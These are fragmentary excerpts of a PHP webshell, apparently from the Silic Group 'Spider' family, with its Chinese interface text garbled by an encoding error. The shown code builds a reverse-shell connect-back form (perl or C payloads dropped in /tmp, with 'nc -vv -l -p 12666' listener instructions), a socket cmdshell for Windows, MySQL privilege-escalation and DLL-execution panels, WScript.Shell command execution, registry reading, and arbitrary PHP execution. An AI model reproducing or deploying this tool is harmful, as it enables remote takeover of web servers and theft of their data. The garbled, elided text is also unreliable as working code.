...
array("PHPзʽ(汾)",strtoupper(php_sapi_name())."(".PHP_VERSION.") / ȫģʽ:".Info_Cfg("safemode")),
array("Ա",$adminmail),
array("ļ·",__FILE__),
...
array("ZIPѹļ֧[ZipArchive(php_zip)]",Info_Fun("zip_open")),
...
if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0){die("Socketʧ");}
...
<br>ĵַ <input type="text" name="yourip" value="{$yourip}" style="width:400px"><br>
Ӷ˿ <input type="text" name="yourport" value="12666" style="width:400px"><br>
ִзʽ <select name="use"><option value="perl">perl</option><option value="c">c</option></select>&nbsp;&nbsp;
...
<h5>linuxȨеķcmdӡ<br>
ԭǽӹܵperlűCд/tmpļв<br>
phpִкܵ·ʧ<br>
nc˿ڣnc -vv -l -p 12666</h5><br><br><br>
<a href="?s=dd&ty=socket"> [ Socket - Windows ] </a><br><br>
<h5>PHPʹSocketcmdshellӡWebshellڷΪWindowsϵͳ<br>
ĿǰûззSocketƣphp_socketsΪopen/enable<br>
ͨphpinfo()鿴Ƿphp_socket<br>
Socketӵ;ڵPHP˲ִкִ<br>
ҪäĿӣɷԴľغ<br>
nc.exe˿ڣnc -vv -l -p 5555<br></h5>
</pre></div>
END;
}
}
...
<a href="?s=n&o=tq">[MYSQLȨ]</a>
<a href="?s=n&o=tk">[MYSQLѿⱸ]</a>
...
fputs($fp,$mysql);
fclose($fp);
$tip="<br><center>ݱݳɹݿļ[<a href=\"".$filename."\" title=\"\">".$filename."</a>]</center>";
}else{$tip="δݣ֤Ŀ¼д";}
print<<<END
...
<input name="install" type="submit" value="װDLL"> <input name="" type="submit" value="ִCMD"><br></form>
END;
if ($_POST[post_sql]) {
$link = mysql_connect ($mhost,$muser,$mpass) or die(mysql_error());
...
Ͷ˿Ϊѡݿ޷ʱɳԲд<br>
űĬ䱸SQLPostgreSQL 8.1<br>
ѿдȷݿ<br>
бοselect relname from pg_stat_user_tables limit 1 offset n;<br>
PostgreSQLɲμ<a href="http://nana.blackbap.org/?p=archive&id=55" target="_blank">[]</a><br><hr></p>
...
or die('磬ϡϢ:'.pg_last_error());
$pgresult=pg_query($pgquery) or die('SQLִз:<br>'.pg_last_error()); 
...
ģʹPHPzip_openչZIPѹļ<br>
ʹǰڡ<b><a href="?s=f">ϵͳϢ</a></b>ȷϵͳ֧php_zip<br>
ѹļ·д¼Ŀ¼·Ŀ¼Ƿɲδ :-(<br>
ȷĿ·д<br><br>
ѹļ·<br>
...
<input type="submit" value="ʼѹ" style="width:80px;"><br><br><br>
...
{$nop}û룺<input type="text" name="wpasw" id="wpasw" value="{$wpasw}" style="width:100px;"><br><br>
...
END;
if($_POST['do']=='do'){
$shell = new COM("WScript.Shell") or die("Shell.Wscriptʧ");
try{$registry_proxystring = $shell->RegRead($regpath);}
catch(Exception $e){echo ': '.$e->getMessage();}
echo $registry_proxystring;
}
}else{
$tip="ݲԱܿõĿΪ֮һ<br>WebshellڷΪWindowsϵͳ<br>PHPȨڷǳεʱԳԱ<br></h5><br><br><br>";
print<<<END
<div class="actall"><pre>
<br><a href="?s=jk&winshell=wscript"> [ WScript ] </a><br><br>
<h5>ʹPHPWindowsеWscript<br>
WscriptΪcmd<br>{$tip}<a href="?s=jk&winshell=shelluser"> [ Shell.User ] </a><br><br>
<h5>ʹPHPWindowsеShell.user<br>
USERΪWindowsϵͳû<br>{$tip}<a href="?s=jk&winshell=regedit"> [ עȡ ] </a><br><br>
<h5>ʹPHPWindowsеShell.Wscript<br>
...
* ޸ı½(!ܻɳʧȥӦ)<br>
* <a href="http://blackbap.org" _target"_blank">Silic Group</a>SpiderľǻSpiderľܵĵ¿<br>
* MD5+SaltܼӶsessionܣɲصı繤<br>
* Ҫ£ɾȥFTP,ע,ShellcodeתƺͷеĹܣйܵĲbugŻ<br>
...
<li><a href="?s=f" id="t_3" onclick="switchTab('t_3')" target="main">ϵͳϢ</a></li>
...
<li><a href="?s=e" id="t_8" onclick="switchTab('t_8')" target="main">ɨľ</a></li>
...
<li><a href="?s=ff" id="t_14" onclick="switchTab('t_14')" target="main">ִphp</a></li>
<li><a href="?s=za" id="t_15" onclick="switchTab('t_15')" target="main">ZIPѹ</a></li></ul></td><td>
